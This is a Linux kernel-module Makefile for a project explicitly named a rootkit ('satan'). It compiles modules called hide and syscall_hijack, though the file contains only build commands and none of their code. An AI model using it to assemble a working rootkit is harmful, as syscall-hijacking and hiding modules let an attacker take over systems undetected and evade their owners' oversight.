KVERSION = $(shell uname -r)
ROOTKIT = satan

obj-m = $(ROOTKIT).o
$(ROOTKIT)-y += main.o hide.o syscall_hijack.o

all:
	make -C /lib/modules/$(KVERSION)/build M=$(PWD) modules
clean:
	make -C /lib/modules/$(KVERSION)/build M=$(PWD) clean
